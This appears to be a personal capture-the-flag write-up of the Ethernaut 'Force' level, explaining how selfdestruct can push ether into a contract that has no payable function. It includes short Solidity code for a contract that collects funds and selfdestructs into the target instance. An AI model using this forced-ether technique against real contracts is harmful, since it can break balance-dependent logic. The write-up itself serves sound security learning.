I definitely needed to consult some other solutions for this one - the base prompts didn't really yield anything useful. I pretty much ripped my solution from the guide [here](https://medium.com/coinmonks/ethernaut-lvl-7-walkthrough-how-to-selfdestruct-and-create-an-ether-blackhole-eb5bb72d2c57).

The following is mostly a copy pasta butI'm putting it here for my own reference.

## Notes
There are 3 ways in which a contract can receive ether:
1. **via payable functions** (with fallback functions being the default)
2. **by receiving mining rewards**
3. **from destroyed contracts** (key here)
    * `selfdestruct` is a low-level opcode call which consumes ~negative gas!~ (sort of a garbage collection incentive to clean up dead contracts)
    * This can be used to destroy a contract and forward remaining eth to a backup address

Example:
```javascript
function suicide() public onlyOwner {
    //recommended: emit an event as well
    selfdestruct(owner);
}
```
## Solution
The `Force` contract we see in this challenge is empty and we're tasked with giving it a balance > 0. To solve this we will:
1. Create a contract on Remix and give it a method to receive funds (which we'll later send to the ethernaut contract)
```javascript
contract Kamikaze {
    function collectFunds() public payable returns(uint) {
        return address(this).balance;
    }
}
```
2. Send the contract some eth (in Remix this can be done by putting an int in the Value input then calling `collectFunds`)
3. Add a call to `selfdestruct` this contract and call it
```javascript
function suicide() public {
    address payable ethernautContract = "<your instance here>";
    selfdestruct(ethernautContract);
}
```
